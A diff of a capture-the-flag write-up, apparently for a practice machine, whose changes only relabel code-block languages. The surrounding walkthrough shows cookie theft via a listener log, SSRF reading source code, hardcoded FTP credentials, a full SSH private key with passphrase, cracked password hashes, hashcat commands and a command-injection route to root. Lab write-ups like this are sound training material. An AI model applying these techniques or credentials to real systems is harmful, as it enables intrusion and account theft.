@@ -30,7 +30,7 @@ I started with an Nmap scan to identify open ports on the target machine. The sc
 
 Next, I conducted an aggressive scan to gather more detailed information about the services running on these ports. The results provided insights into potential vulnerabilities and configurations that could be exploited.
 
-```xml
+```jsx
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -68,7 +68,7 @@ This payload successfully captured the cookie by sending the cookie data to my s
 
 After countless attempts and troubleshooting, I finally managed to capture the session cookie. This involved restarting the processes and refining my methods multiple times, but persistence paid off.
 
-```xml
+```bash
 10.129.54.146 - - [28/Apr/2024 11:51:15] "GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 404 -
 10.129.54.146 - - [28/Apr/2024 11:51:15] code 404, message File not found
 10.129.54.146 - - [28/Apr/2024 11:51:15] "GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 404 -
@@ -80,7 +80,7 @@ Using the stolen cookie, I accessed the "Create PDF Report" site. From here, I e
 
 Through this SSRF attack, I received a new cookie:
 
-```
+```plaintext
 eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRzZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
 ```
 
@@ -90,7 +90,7 @@ eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMz
 
 By leveraging the SSRF vulnerability, I noticed that the reply contained the following user agent:
 
-```makefile
+```plaintext
 User-Agent: Python-urllib/3.11
 ```
 
@@ -110,7 +110,7 @@ Using the SSRF vulnerability, I targeted the specific path where the application
 
 By analyzing the source code retrieved from **`python3/app/code/app.py`**, I developed a blueprint to help navigate and identify interesting components within the application. This blueprint focused on key areas such as routes, functions, and any hardcoded sensitive information.
 
-```xml
+```bash
 project_folder/
 │
 ├── app.py
@@ -143,7 +143,7 @@ project_folder/
 
 With the useful code extracted from **`dashboard.py`** using the SSRF vulnerability, we can analyze it to identify critical functionalities, potential vulnerabilities, and further actions for exploitation.
 
-```xml
+```python
 try:
     ftp = FTP('ftp.local')
     ftp.login(user='ftp_admin', passwd='u3jai8y71s2')
@@ -173,7 +173,7 @@ I used the FTP credentials as an SSRF payload from the previous step. We observe
 
 With this payload, I will attempt to view the private key located at the following FTP URL: **`ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key`**.
 
-```xml
+```plaintext
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg
 cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud
@@ -221,7 +221,7 @@ There is also a passphrase "**`Y27SH19HDIWD`**" on the FTP server, which we can 
 
 Now I will execute **`ssh-add`** to extract the username from the **`id_rsa`** file.
 
-```xml
+```bash
 ┌──(kali㉿kali)-[~/s5]
 └─$ ssh-add id_rsa
 Enter passphrase for id_rsa: 
@@ -238,7 +238,7 @@ We successfully obtained the user flag! 🚩
 
 Now, I'll run LinPEAS by fetching it from my host system using a HTTP server created with Python.
 
-```xml
+```bash
 ╔══════════╣ Users with console
 adam:x:1002:1002:,,,:/home/adam:/bin/bash                                                                                                                                                                         
 dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
@@ -253,7 +253,7 @@ Additionally, I found a users.db file in the blueprints directory. I will view i
 
 The users.db file contains a hash for the user "adam". We can attempt to crack it using hashcat, John the Ripper, or any other preferred tool.
 
-```
+```bash
 ����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�3�EtableusersusersCREATE TABLE users (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     username TEXT NOT NULL UNIQUE,
@@ -261,7 +261,6 @@ The users.db file contains a hash for the user "adam". We can attempt to crack i
     role TEXT DEFAULT 'user'
 ,�,##w��h�=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevh�=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin
 ������
-
 ```
 
 After cracking the hash for user "adam" using hashcat with the command:
@@ -272,7 +271,7 @@ hashcat.exe -m 30120 myhash.txt rockyou.txt
 
 The credentials for user "adam" are:
 
-```
+```plaintext
 username: adam
 password: adam gray
 ```
@@ -332,7 +331,7 @@ The "runner1.c" file contains the authentication code, but it's hashed in MD5. I
 
 I cracked the auth code from run-tests.sh file using the following command as we knew the first part of the authentication key **`UHI75GHI****`**and the hash was available in runner1.c:
 
-```css
+```bash
 hashcat.exe -a3 -m0 myhash.txt UHI75GHI?u?u?u?u --self-test-disable
 ```
 
@@ -366,7 +365,7 @@ We know the injection point is **`role_file`**. We need to perform command injec
 
 I ran **`sudo /opt/runner2/runner2 exploit.json`** again.
 
-```json
+```bash
 root@intuition:/home/lopez# cd ~
 root@intuition:~# cat root.txt
 [ROOT_FLAG_R3DACT3D]
